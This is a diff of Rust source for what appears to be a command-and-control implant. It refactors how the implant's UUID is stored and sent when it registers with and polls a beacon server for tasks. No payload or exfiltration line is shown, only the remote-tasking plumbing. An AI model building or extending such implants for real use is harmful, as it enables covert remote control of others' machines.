@@ -1,20 +1,33 @@
 use anyhow::{anyhow, Result};
 use rand::Rng;
+use uuid::Uuid;
 
 use tokio::io::AsyncBufReadExt;
 use tokio::io::BufReader;
 use tokio::process::Command;
 use tonic::transport::Channel;
 
-use super::common::Task;
+use super::common::{Task, Uuid as Id};
 use super::tasks::{
     beacon_service_client::BeaconServiceClient, ConnectionRequest, OutputRequest, PollRequest,
 };
 
 pub struct Implant {
     client: BeaconServiceClient<Channel>,
-    uuid: String,
+    uuid: Uuid,
     heartbeat: u32,
+}
+
+impl From<Id> for Uuid {
+    fn from(value: Id) -> Self {
+        Self::from_u64_pair(value.high, value.low)
+    }
+}
+impl From<Uuid> for Id {
+    fn from(value: Uuid) -> Self {
+        let (high, low) = value.as_u64_pair();
+        Self { high, low }
+    }
 }
 
 impl Implant {
@@ -28,7 +41,7 @@ impl Implant {
 
         Ok(Self {
             client,
-            uuid: response.uuid,
+            uuid: response.uuid.ok_or(anyhow!("No uuid in request"))?.into(),
             heartbeat: response.heartbeat,
         })
     }
@@ -37,12 +50,10 @@ impl Implant {
         let response = self
             .client
             .poll(tonic::Request::new(PollRequest {
-                uuid: self.uuid.clone(),
+                uuid: Some(self.uuid.into()),
             }))
             .await?
             .into_inner();
-
-        // println!("Poll: RESPONSE={:?}", response);
 
         Ok(response.task)
     }
